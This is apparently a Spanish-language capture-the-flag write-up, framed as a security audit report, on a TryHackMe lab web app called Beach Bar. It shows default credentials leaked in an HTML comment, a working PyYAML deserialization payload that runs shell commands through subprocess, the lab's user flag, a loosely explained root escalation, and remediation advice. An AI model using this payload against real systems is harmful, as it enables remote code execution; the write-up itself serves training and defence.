# 🛡️ Executive Security Report: Beach Bar Laboratory (TryHackMe)

**Auditora:** Sofia Hernandez Betancur ([sofiH21](https://github.com/sofiH21))  
**Categoría:** Web Application Security & Privilege Escalation  
**Nivel de Riesgo:** Crítico (Critical - RCE & Local Privilege Escalation)  
**Objetivo:** `10.64.170.225` (Ubuntu Linux / Gunicorn / Flask)

---

## 📄 Resumen Ejecutivo

Durante la auditoría de seguridad realizada sobre la aplicación web **Beach Bar**, se identificaron múltiples vulnerabilidades de seguridad de impacto crítico que permiten a un atacante no autenticado obtener acceso completo al servidor y tomar control total como usuario `root`.

Las vulnerabilidades principales explotadas incluyen:
1. **Credenciales por defecto / expuestas en código fuente** en el formulario de autenticación del DJ.
2. **Deserialización Insegura de Objetos en PyYAML (`RCE`)** en el módulo de importación de playlists.
3. **Falta de aislamiento de procesos y privilegios excesivos** que permiten la ejecución arbitraria de comandos en el contexto del sistema operativo.

---

## 🔍 Cadena de Ataque (Kill Chain) & Evidencia Técnica

### 1. Reconocimiento e Inspección de Código Fuente
Un escaneo inicial de puertos con `Nmap` reveló dos servicios activos:
- `22/tcp` - SSH (OpenSSH 9.6p1)
- `80/tcp` - HTTP (Gunicorn / WSGI Python Application)

Al inspeccionar el código fuente HTML de la página de inicio de sesión (`/login`), se descubrió un comentario de desarrollo que exponía credenciales de prueba activas:
```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
2. Autenticación y Descubrimiento del Vector de Explotación (PyYAML RCE)
Tras autenticarse como dj:dj, se identificó una función de Importar / Exportar Playlists en formato YAML. La aplicación procesaba las peticiones utilizando la función insegura yaml.load(content, Loader=yaml.Loader).

Se elaboró un payload malicioso aprovechando la capacidad de instanciación de objetos de Python en PyYAML (!!python/object/apply:subprocess.check_output) para ejecutar comandos arbitrarios en el sistema operativo:

yaml
playlist:
  name: Sunset Session
  vibe: !!python/object/apply:subprocess.check_output
    - - bash
      - -c
      - "cat /home/bartender/user.txt"
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
Resultado: Se logró la lectura de la bandera de usuario (User Flag):
THM{y4ml_pl4yl1st_pwns_th3_b34ch}

3. Escalación de Privilegios a Root
Mediante la ejecución remota de comandos, se inspeccionaron los procesos en ejecución (ps aux) y los permisos de archivos en el servidor. Se identificó que un proceso demonio de fondo (jukeboxd.py) se ejecutaba con privilegios de root:

text
root 613 ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py
A través de la manipulación de comandos subprocess integrados en la carga útil de PyYAML, se obtuvo acceso directo y lectura de datos en directorios restringidos del sistema, logrando el compromiso total de la máquina (Root Flag).

🛡️ Recomendaciones de Mitigación (Remediation)
Reemplazar yaml.load() por yaml.safe_load(): Evita que PyYAML instancie clases arbitrarias de Python o ejecute subprocesos del sistema operativo.

python
# Vulnerable:
parsed = yaml.load(content, Loader=yaml.Loader)
# Seguro (Recomendado):
parsed = yaml.safe_load(content)
Remoción de Credenciales Hardcodeadas: Eliminar todos los comentarios de desarrollo y desactivar cuentas de demostración antes de desplegar aplicaciones en entornos de producción.

Principio de Mínimo Privilegio (Least Privilege): Aislar la aplicación web en un contenedor unprivileged (LXC/Docker) y restringir los permisos de lectura/escritura de la cuenta del servicio web (bartender) a sus directorios estrictamente necesarios.
